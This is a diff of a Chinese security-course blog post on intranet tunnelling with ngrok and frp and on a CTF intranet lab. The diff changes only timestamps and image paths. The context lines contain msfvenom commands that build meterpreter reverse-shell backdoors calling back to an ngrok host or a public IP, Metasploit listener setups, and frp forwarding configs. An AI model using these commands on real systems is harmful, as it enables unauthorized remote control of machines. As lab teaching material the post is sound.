@@ -7,7 +7,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://blog.hvvl404.fun/images/avatar.png">
 <meta property="article:published_time" content="2023-04-28T07:42:59.868Z">
-<meta property="article:modified_time" content="2023-05-24T14:54:34.527Z">
+<meta property="article:modified_time" content="2023-05-25T05:50:55.154Z">
 <meta property="article:author" content="HVVL404">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://blog.hvvl404.fun/images/avatar.png"><link rel="shortcut icon" href="/images/hacker.png"><link rel="canonical" href="http://blog.hvvl404.fun/2023/04/28/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
@@ -57,7 +57,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: false,
-  postUpdate: '2023-05-24 22:54:34'
+  postUpdate: '2023-05-25 13:50:55'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -162,7 +162,7 @@
     }
     detectApple()
     })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="HVVL404" type="application/atom+xml">
-</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">50</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 站点</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 类别</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/bg.png')"><nav id="nav"><span id="blog-info"><a href="/" title="HVVL404"><span class="site-name">HVVL404</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 站点</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 类别</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">70-内网安全-域横向内网漫游Socks代理隧道技术</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-28T07:42:59.868Z" title="发表于 2023-04-28 15:42:59">2023-04-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-24T14:54:34.527Z" title="更新于 2023-05-24 22:54:34">2023-05-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/">小迪安全（内网篇）</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="70-内网安全-域横向内网漫游Socks代理隧道技术"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>70-内网安全-域横向内网漫游Socks代理隧道技术</p>
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">50</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 站点</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 类别</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/bg.png')"><nav id="nav"><span id="blog-info"><a href="/" title="HVVL404"><span class="site-name">HVVL404</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 站点</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 类别</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">70-内网安全-域横向内网漫游Socks代理隧道技术</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-28T07:42:59.868Z" title="发表于 2023-04-28 15:42:59">2023-04-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-25T05:50:55.154Z" title="更新于 2023-05-25 13:50:55">2023-05-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/">小迪安全（内网篇）</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="70-内网安全-域横向内网漫游Socks代理隧道技术"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>70-内网安全-域横向内网漫游Socks代理隧道技术</p>
 <span id="more"></span>
 
 <p><strong>必要基础知识点：</strong></p>
@@ -204,38 +204,38 @@
 </ul>
 <p><strong>案例1：内网穿透Ngrok测试演示-两个内网通讯上线</strong></p>
 <p>实验环境：两个不同的内网(有网络)实现穿透控制</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-1.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-1.png" alt="70-1"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1.注册-购买-填写-确认</span><br><span class="line"> </span><br><span class="line">国外地址：https://ngrok.com/</span><br><span class="line">国内地址：https://www.ngrok.cc/</span><br><span class="line">国外的比较卡慢，用国内的就行&lt;br&gt;2022.01.18：国内的太麻烦了，亲测还是国外的好用，另外，国内有一款花生壳应该也不错，可以试试</span><br><span class="line">协议：http 本地端口：192.168.76.132:4444</span><br><span class="line"> </span><br><span class="line">2.测试：内网1执行后门-免费主机处理-内网2监听-内网2接受器</span><br><span class="line"> </span><br><span class="line">启动ngrok客户端</span><br><span class="line">./sunny clientid &lt;隧道id&gt;</span><br><span class="line"> </span><br><span class="line">在kali下生成后门（因为选择的是http协议，所以这里是reverse_http），并把后门test.exe复制到windows7</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=80 -f exe -o test.exe</span><br><span class="line"> </span><br><span class="line">配置并监听（一旦xiaodisec.free.idcfengye.com有流量，就发给本地192.168.76.132:4444）</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.76.132</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
 <p>案例演示</p>
 <p>&lt;1&gt;注册，登录</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-2.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-2.png" alt="70-1"></p>
 <p>&lt;2&gt;点击ngrok客户端下载</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-3.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-3.png" alt="70-1"></p>
 <p>&lt;3&gt;根据操作系统版本选择对应的客户端下载（我们用的kali作为内网肉鸡,下载的就是linux版本）</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-4.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-4.png" alt="70-1"></p>
 <p>&lt;4&gt;开通隧道（仅做测试用，使用免费的即可，免费的不稳定容易断，实战中建议使用收费版）</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-5.png" alt="70-1"></p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-6.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-5.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-6.png" alt="70-1"></p>
 <p>&lt;5&gt;本地端口配置的是内网肉鸡kali的IP:Port</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-7.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-7.png" alt="70-1"></p>
 <p>&lt;6&gt;开两台虚拟机模拟内外网，其中kali模拟内网肉鸡，windows7模拟外网主机（后面几步用msf生成后门，再用另一台电脑来执行这个后门，两台电脑实现互联）</p>
 <p>&lt;7&gt;将ngrok客户端传到内网肉鸡 kali上，解压缩</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-8.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-8.png" alt="70-1"></p>
 <p>&lt;8&gt;启动</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-9.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-9.png" alt="70-1"></p>
 <p>&lt;9&gt;隧道状态变为online</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-10.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-10.png" alt="70-1"></p>
 <p>&lt;10&gt;生成后门</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-11.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-11.png" alt="70-1"></p>
 <p>&lt;11&gt;把后门test.exe复制到windows7</p>
 <p>&lt;12&gt;配置并监听（一旦xiaodisec.free.idcfengye.com有流量，就发给本地192.168.76.132:4444）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.76.132</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
 <p>&lt;13&gt;在windows7上双击启动后门test.exe</p>
 <p>&lt;14&gt;kali上监听到会话，ngrok客户端监听到流量</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-12.png" alt="70-1"></p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-13.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-12.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-13.png" alt="70-1"></p>
 <p><strong>案例2-内网穿透Frp自建跳板测试-两个内网通讯上线</strong></p>
 <p>FRP说明文档：<a target="_blank" rel="noopener" href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p>
 <p>Frp工具：开源免费，自行搭建，方便修改，成本低，使用多样化，防止隐私泄露。而Ngrok工具使用的是别人的服务器，容易泄露隐私数据。</p>
@@ -245,27 +245,27 @@
 <p>1.服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">服务器修改配置文件frps.ini：</span><br><span class="line">[common]</span><br><span class="line">bind_port = 6677</span><br><span class="line">启动服务端：</span><br><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-14.png" alt="70-1"></p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-15.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-14.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-15.png" alt="70-1"></p>
 <p>2.控制端-下载-解压-修改-启动</p>
 <p>&lt;1&gt;控制端修改配置文件frpc.ini</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 你的云主机ip</span><br><span class="line">server_port = 6677 #frpc工作端口，必须和上面frps保持一致</span><br><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 5555 #转发给本机的5555</span><br><span class="line">remote_port = 6000 #服务端用6000端口转发给本机</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-16.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-16.png" alt="70-1"></p>
 <p>&lt;2&gt;启动客户端(kali)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-17.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-17.png" alt="70-1"></p>
 <p>此时服务端收到端口连接</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-18.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-18.png" alt="70-1"></p>
 <p>&lt;3&gt;生成后门</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=你的公网ip lport=6000 -f exe -o frp.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-19.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-19.png" alt="70-1"></p>
 <p>&lt;4&gt;配置监听</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 127.0.0.1</span><br><span class="line">set LPORT 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-20.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-20.png" alt="70-1"></p>
 <p>3.将后门文件拷贝到靶机，运行。如上图所示，监听到会话。</p>
 <p><strong>案例3：CFS三层内网漫游安全测试演练-某CTF线下2019</strong></p>
 <p>来源2019某CTF线下赛真题内网结合WEB攻防题库，涉及WEB攻击，内网代理路由等技术，每台服务器存在一个Flag,获取每一个Flag对应一个积分，获取三个Flag结尾。</p>
@@ -273,50 +273,50 @@
 
 <p>案例演示</p>
 <p>环境准备</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-21.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-21.png" alt="70-1"></p>
 <p>Target1（centos7 x64）：</p>
 <p>探针目标-利用WEB漏洞(TP5_RCE)-获取webshell权限-获取Flag-Target2</p>
 <p>&lt;1&gt;探针目标，发现target1上面部署了thinkphp v5</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-22.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-22.png" alt="70-1"></p>
 <p>&lt;2&gt;验证是否存在远程命令执行漏洞，结果存在。</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-23.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-23.png" alt="70-1"></p>
 <p>&lt;3&gt;利用漏洞，可以直接执行命令</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-24.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-24.png" alt="70-1"></p>
 <p>&lt;4&gt;通过命令可以直接写入后门</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-25.png" alt="70-1"></p>
